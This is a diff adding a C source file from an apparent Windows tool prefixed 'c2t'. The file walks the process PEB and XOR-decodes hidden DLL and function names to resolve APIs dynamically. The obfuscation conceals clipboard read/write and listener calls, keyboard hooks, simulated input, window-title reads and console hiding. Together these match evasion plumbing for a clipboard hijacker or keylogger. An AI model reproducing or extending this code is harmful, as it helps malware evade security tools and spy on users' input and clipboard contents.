@@ -1,0 +1,316 @@
+/*
+ * Copyright (C) 2026 roothunter
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program.  If not, see <https://www.gnu.org/licenses/>.
+ */
+
+#include "win32_api.h"
+
+#ifdef _WIN32
+
+#include <string.h>
+
+c2t_win32_api_t g_c2t_win32 = {0};
+static int g_win32_initialized = 0;
+
+void c2t_win32_xor_decode(char *dest, const unsigned char *src, size_t len,
+                          unsigned char key) {
+  for (size_t i = 0; i < len; ++i) {
+    dest[i] = (char)(src[i] ^ key);
+  }
+  dest[len] = '\0';
+}
+
+typedef struct _C2T_UNICODE_STRING {
+  USHORT Length;
+  USHORT MaximumLength;
+  PWSTR Buffer;
+} C2T_UNICODE_STRING;
+
+typedef struct _C2T_LDR_DATA_TABLE_ENTRY {
+  LIST_ENTRY InLoadOrderLinks;
+  LIST_ENTRY InMemoryOrderLinks;
+  LIST_ENTRY InInitializationOrderLinks;
+  PVOID DllBase;
+  PVOID EntryPoint;
+  ULONG SizeOfImage;
+  C2T_UNICODE_STRING FullDllName;
+  C2T_UNICODE_STRING BaseDllName;
+} C2T_LDR_DATA_TABLE_ENTRY;
+
+typedef struct _C2T_PEB_LDR_DATA {
+  ULONG Length;
+  BOOLEAN Initialized;
+  HANDLE SsHandle;
+  LIST_ENTRY InLoadOrderModuleList;
+  LIST_ENTRY InMemoryOrderModuleList;
+  LIST_ENTRY InInitializationOrderModuleList;
+} C2T_PEB_LDR_DATA;
+
+typedef struct _C2T_PEB {
+  BOOLEAN InheritedAddressSpace;
+  BOOLEAN ReadImageFileExecOptions;
+  BOOLEAN BeingDebugged;
+  BOOLEAN BitField;
+  HANDLE Mutant;
+  PVOID ImageBaseAddress;
+  C2T_PEB_LDR_DATA *Ldr;
+} C2T_PEB;
+
+HMODULE c2t_win32_get_module_peb(const wchar_t *module_name) {
+#if defined(_WIN64)
+  C2T_PEB *peb = (C2T_PEB *)__readgsqword(0x60);
+#elif defined(_WIN32)
+  C2T_PEB *peb = (C2T_PEB *)__readfsdword(0x30);
+#else
+  C2T_PEB *peb = NULL;
+#endif
+  if (!peb || !peb->Ldr)
+    return NULL;
+
+  PLIST_ENTRY head = &peb->Ldr->InLoadOrderModuleList;
+  PLIST_ENTRY curr = head->Flink;
+
+  while (curr && curr != head) {
+    C2T_LDR_DATA_TABLE_ENTRY *entry =
+        CONTAINING_RECORD(curr, C2T_LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
+    if (entry->BaseDllName.Buffer) {
+      if (_wcsicmp(entry->BaseDllName.Buffer, module_name) == 0) {
+        return (HMODULE)entry->DllBase;
+      }
+    }
+    curr = curr->Flink;
+  }
+  return NULL;
+}
+
+void c2t_win32_api_init(void) {
+  if (g_win32_initialized)
+    return;
+
+  static const unsigned char enc_user32_dll[] = {47, 41, 63, 40, 105, 104, 116, 62, 54, 54};
+  static const unsigned char enc_kernel32_dll[] = {49, 63, 40, 52, 63, 54, 105, 104, 116, 62, 54, 54};
+  static const unsigned char enc_advapi32_dll[] = {59, 62, 44, 59, 42, 51, 105, 104, 116, 62, 54, 54};
+  static const unsigned char enc_bcrypt_dll[] = {56, 57, 40, 35, 42, 46, 116, 62, 54, 54};
+  static const unsigned char enc_shell32_dll[] = {41, 50, 63, 54, 54, 105, 104, 116, 62, 54, 54};
+
+  /* user32 functions */
+  static const unsigned char enc_GetWindowThreadProcessId[] = {29, 63, 46, 13, 51, 52, 62, 53, 45, 14, 50, 40, 63, 59, 62, 10, 40, 53, 57, 63, 41, 41, 19, 62};
+  static const unsigned char enc_OpenClipboard[] = {21, 42, 63, 52, 25, 54, 51, 42, 56, 53, 59, 40, 62};
+  static const unsigned char enc_CloseClipboard[] = {25, 54, 53, 41, 63, 25, 54, 51, 42, 56, 53, 59, 40, 62};
+  static const unsigned char enc_GetClipboardData[] = {29, 63, 46, 25, 54, 51, 42, 56, 53, 59, 40, 62, 30, 59, 46, 59};
+  static const unsigned char enc_IsClipboardFormatAvailable[] = {19, 41, 25, 54, 51, 42, 56, 53, 59, 40, 62, 28, 53, 40, 55, 59, 46, 27, 44, 59, 51, 54, 59, 56, 54, 63};
+  static const unsigned char enc_EmptyClipboard[] = {31, 55, 42, 46, 35, 25, 54, 51, 42, 56, 53, 59, 40, 62};
+  static const unsigned char enc_SetClipboardData[] = {9, 63, 46, 25, 54, 51, 42, 56, 53, 59, 40, 62, 30, 59, 46, 59};
+  static const unsigned char enc_AddClipboardFormatListener[] = {27, 62, 62, 25, 54, 51, 42, 56, 53, 59, 40, 62, 28, 53, 40, 55, 59, 46, 22, 51, 41, 46, 63, 52, 63, 40};
+  static const unsigned char enc_RemoveClipboardFormatListener[] = {8, 63, 55, 53, 44, 63, 25, 54, 51, 42, 56, 53, 59, 40, 62, 28, 53, 40, 55, 59, 46, 22, 51, 41, 46, 63, 52, 63, 40};
+  static const unsigned char enc_GetForegroundWindow[] = {29, 63, 46, 28, 53, 40, 63, 61, 40, 53, 47, 52, 62, 13, 51, 52, 62, 53, 45};
+  static const unsigned char enc_GetWindowTextW[] = {29, 63, 46, 13, 51, 52, 62, 53, 45, 14, 63, 34, 46, 13};
+  static const unsigned char enc_CreateWindowExW[] = {25, 40, 63, 59, 46, 63, 13, 51, 52, 62, 53, 45, 31, 34, 13};
+  static const unsigned char enc_DestroyWindow[] = {30, 63, 41, 46, 40, 53, 35, 13, 51, 52, 62, 53, 45};
+  static const unsigned char enc_RegisterClassW[] = {8, 63, 61, 51, 41, 46, 63, 40, 25, 54, 59, 41, 41, 13};
+  static const unsigned char enc_UnregisterClassW[] = {15, 52, 40, 63, 61, 51, 41, 46, 63, 40, 25, 54, 59, 41, 41, 13};
+  static const unsigned char enc_DefWindowProcW[] = {30, 63, 60, 13, 51, 52, 62, 53, 45, 10, 40, 53, 57, 13};
+  static const unsigned char enc_PeekMessageW[] = {10, 63, 63, 49, 23, 63, 41, 41, 59, 61, 63, 13};
+  static const unsigned char enc_TranslateMessage[] = {14, 40, 59, 52, 41, 54, 59, 46, 63, 23, 63, 41, 41, 59, 61, 63};
+  static const unsigned char enc_DispatchMessageW[] = {30, 51, 41, 42, 59, 46, 57, 50, 23, 63, 41, 41, 59, 61, 63, 13};
+  static const unsigned char enc_ShowWindow[] = {9, 50, 53, 45, 13, 51, 52, 62, 53, 45};
+  static const unsigned char enc_SetWindowsHookExW[] = {9, 63, 46, 13, 51, 52, 62, 53, 45, 41, 18, 53, 53, 49, 31, 34, 13};
+  static const unsigned char enc_UnhookWindowsHookEx[] = {15, 52, 50, 53, 53, 49, 13, 51, 52, 62, 53, 45, 41, 18, 53, 53, 49, 31, 34};
+  static const unsigned char enc_CallNextHookEx[] = {25, 59, 54, 54, 20, 63, 34, 46, 18, 53, 53, 49, 31, 34};
+  static const unsigned char enc_VkKeyScanW[] = {12, 49, 17, 63, 35, 9, 57, 59, 52, 13};
+  static const unsigned char enc_MapVirtualKeyW[] = {23, 59, 42, 12, 51, 40, 46, 47, 59, 54, 17, 63, 35, 13};
+  static const unsigned char enc_SendInput[] = {9, 63, 52, 62, 19, 52, 42, 47, 46};
+
+  /* kernel32 functions */
+  static const unsigned char enc_CreateProcessA[] = {25, 40, 63, 59, 46, 63, 10, 40, 53, 57, 63, 41, 41, 27};
+  static const unsigned char enc_OpenProcess[] = {21, 42, 63, 52, 10, 40, 53, 57, 63, 41, 41};
+  static const unsigned char enc_TerminateProcess[] = {14, 63, 40, 55, 51, 52, 59, 46, 63, 10, 40, 53, 57, 63, 41, 41};
+  static const unsigned char enc_GetExitCodeProcess[] = {29, 63, 46, 31, 34, 51, 46, 25, 53, 62, 63, 10, 40, 53, 57, 63, 41, 41};
+  static const unsigned char enc_CloseHandle[] = {25, 54, 53, 41, 63, 18, 59, 52, 62, 54, 63};
+  static const unsigned char enc_CreateMutexA[] = {25, 40, 63, 59, 46, 63, 23, 47, 46, 63, 34, 27};
+  static const unsigned char enc_ReleaseMutex[] = {8, 63, 54, 63, 59, 41, 63, 23, 47, 46, 63, 34};
+  static const unsigned char enc_OpenMutexA[] = {21, 42, 63, 52, 23, 47, 46, 63, 34, 27};
+  static const unsigned char enc_CreateEventA[] = {25, 40, 63, 59, 46, 63, 31, 44, 63, 52, 46, 27};
+  static const unsigned char enc_SetEvent[] = {9, 63, 46, 31, 44, 63, 52, 46};
+  static const unsigned char enc_ResetEvent[] = {8, 63, 41, 63, 46, 31, 44, 63, 52, 46};
+  static const unsigned char enc_OpenEventA[] = {21, 42, 63, 52, 31, 44, 63, 52, 46, 27};
+  static const unsigned char enc_WaitForSingleObject[] = {13, 59, 51, 46, 28, 53, 40, 9, 51, 52, 61, 54, 63, 21, 56, 48, 63, 57, 46};
+  static const unsigned char enc_Sleep[] = {9, 54, 63, 63, 42};
+  static const unsigned char enc_GetTickCount64[] = {29, 63, 46, 14, 51, 57, 49, 25, 53, 47, 52, 46, 108, 110};
+  static const unsigned char enc_GetCurrentProcessId[] = {29, 63, 46, 25, 47, 40, 40, 63, 52, 46, 10, 40, 53, 57, 63, 41, 41, 19, 62};
+  static const unsigned char enc_ProcessIdToSessionId[] = {10, 40, 53, 57, 63, 41, 41, 19, 62, 14, 53, 9, 63, 41, 41, 51, 53, 52, 19, 62};
+  static const unsigned char enc_CreateDirectoryA[] = {25, 40, 63, 59, 46, 63, 30, 51, 40, 63, 57, 46, 53, 40, 35, 27};
+  static const unsigned char enc_CreateFileA[] = {25, 40, 63, 59, 46, 63, 28, 51, 54, 63, 27};
+  static const unsigned char enc_DeleteFileA[] = {30, 63, 54, 63, 46, 63, 28, 51, 54, 63, 27};
+  static const unsigned char enc_MoveFileExA[] = {23, 53, 44, 63, 28, 51, 54, 63, 31, 34, 27};
+  static const unsigned char enc_GetConsoleWindow[] = {29, 63, 46, 25, 53, 52, 41, 53, 54, 63, 13, 51, 52, 62, 53, 45};
+  static const unsigned char enc_FreeConsole[] = {28, 40, 63, 63, 25, 53, 52, 41, 53, 54, 63};
+  static const unsigned char enc_SetConsoleCtrlHandler[] = {9, 63, 46, 25, 53, 52, 41, 53, 54, 63, 25, 46, 40, 54, 18, 59, 52, 62, 54, 63, 40};
+  static const unsigned char enc_SetConsoleTitleA[] = {9, 63, 46, 25, 53, 52, 41, 53, 54, 63, 14, 51, 46, 54, 63, 27};
+  static const unsigned char enc_WideCharToMultiByte[] = {13, 51, 62, 63, 25, 50, 59, 40, 14, 53, 23, 47, 54, 46, 51, 24, 35, 46, 63};
+  static const unsigned char enc_MultiByteToWideChar[] = {23, 47, 54, 46, 51, 24, 35, 46, 63, 14, 53, 13, 51, 62, 63, 25, 50, 59, 40};
+  static const unsigned char enc_QueryFullProcessImageNameA[] = {11, 47, 63, 40, 35, 28, 47, 54, 54, 10, 40, 53, 57, 63, 41, 41, 19, 55, 59, 61, 63, 20, 59, 55, 63, 27};
+  static const unsigned char enc_QueryFullProcessImageNameW[] = {11, 47, 63, 40, 35, 28, 47, 54, 54, 10, 40, 53, 57, 63, 41, 41, 19, 55, 59, 61, 63, 20, 59, 55, 63, 13};
+  static const unsigned char enc_GlobalLock[] = {29, 54, 53, 56, 59, 54, 22, 53, 57, 49};
+  static const unsigned char enc_GlobalUnlock[] = {29, 54, 53, 56, 59, 54, 15, 52, 54, 53, 57, 49};
+  static const unsigned char enc_GlobalSize[] = {29, 54, 53, 56, 59, 54, 9, 51, 32, 63};
+  static const unsigned char enc_GlobalAlloc[] = {29, 54, 53, 56, 59, 54, 27, 54, 54, 53, 57};
+  static const unsigned char enc_GlobalFree[] = {29, 54, 53, 56, 59, 54, 28, 40, 63, 63};
+  static const unsigned char enc_GetModuleFileNameA[] = {29, 63, 46, 23, 53, 62, 47, 54, 63, 28, 51, 54, 63, 20, 59, 55, 63, 27};
+  static const unsigned char enc_GetModuleFileNameW[] = {29, 63, 46, 23, 53, 62, 47, 54, 63, 28, 51, 54, 63, 20, 59, 55, 63, 13};
+  static const unsigned char enc_GetModuleHandleA[] = {29, 63, 46, 23, 53, 62, 47, 54, 63, 18, 59, 52, 62, 54, 63, 27};
+  static const unsigned char enc_GetModuleHandleW[] = {29, 63, 46, 23, 53, 62, 47, 54, 63, 18, 59, 52, 62, 54, 63, 13};
+  static const unsigned char enc_LoadLibraryA[] = {22, 53, 59, 62, 22, 51, 56, 40, 59, 40, 35, 27};
+  static const unsigned char enc_LoadLibraryW[] = {22, 53, 59, 62, 22, 51, 56, 40, 59, 40, 35, 13};
+  static const unsigned char enc_GetProcAddress[] = {29, 63, 46, 10, 40, 53, 57, 27, 62, 62, 40, 63, 41, 41};
+
+  /* advapi32 functions */
+  static const unsigned char enc_SystemFunction036[] = {9, 35, 41, 46, 63, 55, 28, 47, 52, 57, 46, 51, 53, 52, 106, 105, 108};
+
+  /* bcrypt functions */
+  static const unsigned char enc_BCryptOpenAlgorithmProvider[] = {24, 25, 40, 35, 42, 46, 21, 42, 63, 52, 27, 54, 61, 53, 40, 51, 46, 50, 55, 10, 40, 53, 44, 51, 62, 63, 40};
+  static const unsigned char enc_BCryptGenRandom[] = {24, 25, 40, 35, 42, 46, 29, 63, 52, 8, 59, 52, 62, 53, 55};
+  static const unsigned char enc_BCryptCloseAlgorithmProvider[] = {24, 25, 40, 35, 42, 46, 25, 54, 53, 41, 63, 27, 54, 61, 53, 40, 51, 46, 50, 55, 10, 40, 53, 44, 51, 62, 63, 40};
+
+  /* shell32 functions */
+  static const unsigned char enc_SHGetFolderPathW[] = {9, 18, 29, 63, 46, 28, 53, 54, 62, 63, 40, 10, 59, 46, 50, 13};
+  static const unsigned char enc_DragQueryFileW[] = {30, 40, 59, 61, 11, 47, 63, 40, 35, 28, 51, 54, 63, 13};
+
+  char dll_user32[32], dll_kernel32[32], dll_advapi32[32], dll_bcrypt[32], dll_shell32[32];
+  c2t_win32_xor_decode(dll_user32, enc_user32_dll, sizeof(enc_user32_dll), 0x5A);
+  c2t_win32_xor_decode(dll_kernel32, enc_kernel32_dll, sizeof(enc_kernel32_dll), 0x5A);
+  c2t_win32_xor_decode(dll_advapi32, enc_advapi32_dll, sizeof(enc_advapi32_dll), 0x5A);
+  c2t_win32_xor_decode(dll_bcrypt, enc_bcrypt_dll, sizeof(enc_bcrypt_dll), 0x5A);
+  c2t_win32_xor_decode(dll_shell32, enc_shell32_dll, sizeof(enc_shell32_dll), 0x5A);
+
+  HMODULE hKernel32 = c2t_win32_get_module_peb(L"kernel32.dll");
+  if (!hKernel32) hKernel32 = GetModuleHandleA(dll_kernel32);
+  if (!hKernel32) hKernel32 = LoadLibraryA(dll_kernel32);
+
+  HMODULE hUser32 = c2t_win32_get_module_peb(L"user32.dll");
+  if (!hUser32) hUser32 = GetModuleHandleA(dll_user32);
+  if (!hUser32 && hKernel32) hUser32 = LoadLibraryA(dll_user32);
+
+  HMODULE hAdvapi32 = c2t_win32_get_module_peb(L"advapi32.dll");
+  if (!hAdvapi32) hAdvapi32 = GetModuleHandleA(dll_advapi32);
+  if (!hAdvapi32 && hKernel32) hAdvapi32 = LoadLibraryA(dll_advapi32);
+
+  HMODULE hBcrypt = c2t_win32_get_module_peb(L"bcrypt.dll");
+  if (!hBcrypt) hBcrypt = GetModuleHandleA(dll_bcrypt);
+  if (!hBcrypt && hKernel32) hBcrypt = LoadLibraryA(dll_bcrypt);
+
+  HMODULE hShell32 = c2t_win32_get_module_peb(L"shell32.dll");
+  if (!hShell32) hShell32 = GetModuleHandleA(dll_shell32);
+  if (!hShell32 && hKernel32) hShell32 = LoadLibraryA(dll_shell32);
+
+#define LOAD_API(hMod, field, enc_arr)                                         \
+  do {                                                                         \
+    if (hMod) {                                                                \
+      char fn_name[64];                                                        \
+      c2t_win32_xor_decode(fn_name, enc_arr, sizeof(enc_arr), 0x5A);          \
+      FARPROC p = GetProcAddress(hMod, fn_name);                               \
+      memcpy(&g_c2t_win32.field, &p, sizeof(g_c2t_win32.field));               \
+    }                                                                          \
+  } while (0)
+
+  /* user32 */
+  LOAD_API(hUser32, GetWindowThreadProcessId, enc_GetWindowThreadProcessId);
+  LOAD_API(hUser32, OpenClipboard, enc_OpenClipboard);
+  LOAD_API(hUser32, CloseClipboard, enc_CloseClipboard);
+  LOAD_API(hUser32, GetClipboardData, enc_GetClipboardData);
+  LOAD_API(hUser32, IsClipboardFormatAvailable, enc_IsClipboardFormatAvailable);
+  LOAD_API(hUser32, EmptyClipboard, enc_EmptyClipboard);
+  LOAD_API(hUser32, SetClipboardData, enc_SetClipboardData);
+  LOAD_API(hUser32, AddClipboardFormatListener, enc_AddClipboardFormatListener);
+  LOAD_API(hUser32, RemoveClipboardFormatListener, enc_RemoveClipboardFormatListener);
+  LOAD_API(hUser32, GetForegroundWindow, enc_GetForegroundWindow);
+  LOAD_API(hUser32, GetWindowTextW, enc_GetWindowTextW);
+  LOAD_API(hUser32, CreateWindowExW, enc_CreateWindowExW);
+  LOAD_API(hUser32, DestroyWindow, enc_DestroyWindow);
+  LOAD_API(hUser32, RegisterClassW, enc_RegisterClassW);
+  LOAD_API(hUser32, UnregisterClassW, enc_UnregisterClassW);
+  LOAD_API(hUser32, DefWindowProcW, enc_DefWindowProcW);
+  LOAD_API(hUser32, PeekMessageW, enc_PeekMessageW);
+  LOAD_API(hUser32, TranslateMessage, enc_TranslateMessage);
+  LOAD_API(hUser32, DispatchMessageW, enc_DispatchMessageW);
+  LOAD_API(hUser32, ShowWindow, enc_ShowWindow);
+  LOAD_API(hUser32, SetWindowsHookExW, enc_SetWindowsHookExW);
+  LOAD_API(hUser32, UnhookWindowsHookEx, enc_UnhookWindowsHookEx);
+  LOAD_API(hUser32, CallNextHookEx, enc_CallNextHookEx);
+  LOAD_API(hUser32, VkKeyScanW, enc_VkKeyScanW);
+  LOAD_API(hUser32, MapVirtualKeyW, enc_MapVirtualKeyW);
+  LOAD_API(hUser32, SendInput, enc_SendInput);
+
+  /* kernel32 */
+  LOAD_API(hKernel32, CreateProcessA, enc_CreateProcessA);
+  LOAD_API(hKernel32, OpenProcess, enc_OpenProcess);
+  LOAD_API(hKernel32, TerminateProcess, enc_TerminateProcess);
+  LOAD_API(hKernel32, GetExitCodeProcess, enc_GetExitCodeProcess);
+  LOAD_API(hKernel32, CloseHandle, enc_CloseHandle);
+  LOAD_API(hKernel32, CreateMutexA, enc_CreateMutexA);
+  LOAD_API(hKernel32, ReleaseMutex, enc_ReleaseMutex);
+  LOAD_API(hKernel32, OpenMutexA, enc_OpenMutexA);
+  LOAD_API(hKernel32, CreateEventA, enc_CreateEventA);
+  LOAD_API(hKernel32, SetEvent, enc_SetEvent);
+  LOAD_API(hKernel32, ResetEvent, enc_ResetEvent);
+  LOAD_API(hKernel32, OpenEventA, enc_OpenEventA);
+  LOAD_API(hKernel32, WaitForSingleObject, enc_WaitForSingleObject);
+  LOAD_API(hKernel32, Sleep, enc_Sleep);
+  LOAD_API(hKernel32, GetTickCount64, enc_GetTickCount64);
+  LOAD_API(hKernel32, GetCurrentProcessId, enc_GetCurrentProcessId);
+  LOAD_API(hKernel32, ProcessIdToSessionId, enc_ProcessIdToSessionId);
+  LOAD_API(hKernel32, CreateDirectoryA, enc_CreateDirectoryA);
+  LOAD_API(hKernel32, CreateFileA, enc_CreateFileA);
+  LOAD_API(hKernel32, DeleteFileA, enc_DeleteFileA);
+  LOAD_API(hKernel32, MoveFileExA, enc_MoveFileExA);
+  LOAD_API(hKernel32, GetConsoleWindow, enc_GetConsoleWindow);
+  LOAD_API(hKernel32, FreeConsole, enc_FreeConsole);
+  LOAD_API(hKernel32, SetConsoleCtrlHandler, enc_SetConsoleCtrlHandler);
+  LOAD_API(hKernel32, SetConsoleTitleA, enc_SetConsoleTitleA);
+  LOAD_API(hKernel32, WideCharToMultiByte, enc_WideCharToMultiByte);
+  LOAD_API(hKernel32, MultiByteToWideChar, enc_MultiByteToWideChar);
+  LOAD_API(hKernel32, QueryFullProcessImageNameA, enc_QueryFullProcessImageNameA);
+  LOAD_API(hKernel32, QueryFullProcessImageNameW, enc_QueryFullProcessImageNameW);
+  LOAD_API(hKernel32, GlobalLock, enc_GlobalLock);
+  LOAD_API(hKernel32, GlobalUnlock, enc_GlobalUnlock);
+  LOAD_API(hKernel32, GlobalSize, enc_GlobalSize);
+  LOAD_API(hKernel32, GlobalAlloc, enc_GlobalAlloc);
+  LOAD_API(hKernel32, GlobalFree, enc_GlobalFree);
+  LOAD_API(hKernel32, GetModuleFileNameA, enc_GetModuleFileNameA);
+  LOAD_API(hKernel32, GetModuleFileNameW, enc_GetModuleFileNameW);
+  LOAD_API(hKernel32, GetModuleHandleA, enc_GetModuleHandleA);
+  LOAD_API(hKernel32, GetModuleHandleW, enc_GetModuleHandleW);
+  LOAD_API(hKernel32, LoadLibraryA, enc_LoadLibraryA);
+  LOAD_API(hKernel32, LoadLibraryW, enc_LoadLibraryW);
+  LOAD_API(hKernel32, GetProcAddress, enc_GetProcAddress);
+
+  /* advapi32 */
+  LOAD_API(hAdvapi32, RtlGenRandom, enc_SystemFunction036);
+
+  /* bcrypt */
+  LOAD_API(hBcrypt, BCryptOpenAlgorithmProvider, enc_BCryptOpenAlgorithmProvider);
+  LOAD_API(hBcrypt, BCryptGenRandom, enc_BCryptGenRandom);
+  LOAD_API(hBcrypt, BCryptCloseAlgorithmProvider, enc_BCryptCloseAlgorithmProvider);
+
+  /* shell32 */
+  LOAD_API(hShell32, SHGetFolderPathW, enc_SHGetFolderPathW);
+  LOAD_API(hShell32, DragQueryFileW, enc_DragQueryFileW);
+
+#undef LOAD_API
+
+  g_win32_initialized = 1;
+}
+
+#endif /* _WIN32 */
